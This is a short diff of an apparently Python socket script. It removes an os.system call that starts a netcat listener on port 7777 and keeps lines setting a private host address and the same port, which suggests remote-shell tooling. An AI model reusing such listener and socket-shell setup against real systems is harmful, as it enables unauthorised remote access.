@@ -1,7 +1,3 @@
-import os 
-os.system("nc -lnvp 7777")
-
-
 import socket
 host = '192.168.66.136'
 port = 7777
